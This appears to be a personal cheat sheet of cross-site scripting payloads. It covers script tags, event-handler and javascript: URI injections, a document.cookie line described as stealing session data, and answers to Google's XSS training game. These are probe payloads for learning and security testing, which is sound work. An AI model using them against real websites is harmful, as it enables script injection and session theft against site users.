# My XSS Payloads    ~ SudoHopeX
-------------------------------------------------------------------------------------

[+] Test if Payload is working

+ First step to check for xss
<script>alert(1)</script>
<script>alert`1`</script>

+ When alert(1) is blocked
<script>prompt('XSS')</script>

+ testing silently without alert boxes
<script>console.log('XSS')</script>

+ when <script> tag is not working, then use it within an html element

onclick="alert(1)"

<a href="#" onclick="alert(1)">Click Me!</a>

<a onclick="alert(1)">Click Me!</a>

onerror=alert(1) <- adding an element with false link and generating alert in error

"><img src=x onerror=alert(1)>

<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

+ See (steal) session data.
<script>alert(document.cookie)</script>

+ generating an error to check
' <- try single-quote(') to check for any error within page or console

------------------------------------------------------------------------------------
[+] Google's XSS game solutions

1. <script>alert(1)</script>                            // context -> within html
2. <a href="" onclick="alert(1)">click Me</a>           // context -> within html
3. 3' onerror='alert(1)'>//                             // context -> within html tags ( img attributes )
4. ')%3Balert(1,'                                       // context -> within javascript
5. javascript:alert(1);                                 // context -> within html tags ( a attributes )
6. data:text/javascript,alert('XSS') or data:text/plain,alert(1)     // context -> within html tags ( script src tag ), loading files dynamically via url
-------------------------------------------------------------------------------------
